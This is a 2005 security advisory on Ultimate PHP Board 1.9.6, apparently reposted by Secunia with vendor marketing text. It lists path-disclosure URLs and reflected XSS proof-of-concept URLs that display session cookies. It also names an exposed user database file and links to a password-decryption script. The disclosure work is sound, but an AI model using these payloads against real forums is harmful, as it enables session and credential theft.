M4DR007-06SA (security advisory): Multiple vulnerabilities in UPB 1.9.6 GOLD

Published: 06 16 2005

Released: 06 16 2005

Name: Ultimate PHP Board (UPB)

Affected Systems: <= 1.9.6 GOLD

Issue: Full Path Disclosure, Cross-Site Scripting, Sensitive Information
Disclosure

Author: Alberto Trivero

Vendor: <http://www.myupb.com/ourscripts_upb.php>

Software Description

***********

"UPB is a forum/message board script. It supports threaded discussion with a
comprehesive text database system that we wrote here at php outburst for the
backend."

Full Path Disclosure

*******

Thanks to an improper control of the value of some variables it's possible
to cause some errors and obtain the full path by sending simples requests
like these:

    <http://www.example.com/upb/viewtopic.php?id=0>
    <http://www.example.com/upb/profile.php?action=get&id=0>
    <http://www.example.com/upb/newpost.php?t_id=0>

Cross-Site Scripting (XSS)

*******

Let's look at code from login.php at line 69:

    <?
    ...
    echo "<form action='login.php?ref=$ref&l=1' method=POST>

    <center>$skin_tableheading
    ...
    ?>

The $rev parameter can be controlled by a remote user and when UPB get the
value don't sanitise properly it, so a malicious user can inject some HTML
code like this:

    '><script>alert(document.cookie)</script>

that will change the HTML line in:

    <form
action='login.php?ref='><script>alert(document.cookie)</script>&l=1'
method=POST>

executing the <script>...</script> tag that show, in this case, the cookies.
This is the PoC URL:

<http://www.example.com/upb/login.php?ref=%27%3E%3Cscript%3Ealert>(document.co
okie)%3C/script%3E

Let's look now at code from viewtopic.php at line 13:

    <?
    ...
    $where = "<b>></b> <a href='viewforum.php?id=$id'>$w_forum[forum]</a>
<b>></b> $w_topic[subject]";
    ...
    ?>

We can notice in the $id parameter the same preceding problem explottable
with an URL like this:

<http://www.example.com/upb/viewtopic.php?id=%27%3E%3Cscript%3Ealert>(document
.cookie)%3C/script%3E

These are other PoC URLs for other parameters:

<http://www.example.com/upb/viewtopic.php?id=1&t_id=1&page=%27%3E%3Cscript%3E>
alert(document.cookie)%3C/script%3E

<http://www.example.com/upb/profile.php?action=get&id=%27%3E%3Cscript%3Ealert>
(document.cookie)%3C/script%3E

<http://www.example.com/upb/newpost.php?id=1&t=1&t_id=%27%3E%3Cscript%3Ealert>
(document.cookie)%3C/script%3E

<http://www.example.com/upb/newpost.php?id=%27%3E%3Cscript%3Ealert>(document.c
ookie)%3C/script%3E

<http://www.example.com/upb/email.php?id=%27%3E%3Cscript%3Ealert>(document.coo

<http://www.example.com/upb/icq.php?action=get&id=%27%3E%3Cscript%3Ealert>(doc

cookie)%3C/script%3E

<http://www.example.com/upb/search.php?step=3&sText=%27%3E%3Cscript%3Ealert>(d
ocument.cookie)%3C/script%3E

Sensitive Information Disclosure

*********

In many cases (every time with non Apache webservers but some time also with
its) it's possible to obtain sensitives informations about all the users
registered on the UPB forum by surfing on this file:

    <http://www.example.com/upb/db/users.dat>

and viewing informations structured in this way:

user_name<~>password<~>level<~>email<~>view_email<~>mail_list<~>location<~>u
rl<~>avatar<~>icq<~>aim<~>msn<~>sig<~>posts<~>date_added<~>id

The passwords of users are crypted and for automate the decription I made a
code available at this address: <http://albythebest.altervista.org/upb.pl>

Solution

*********

The vendor has been contacted many times but a patch was not yet produced.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
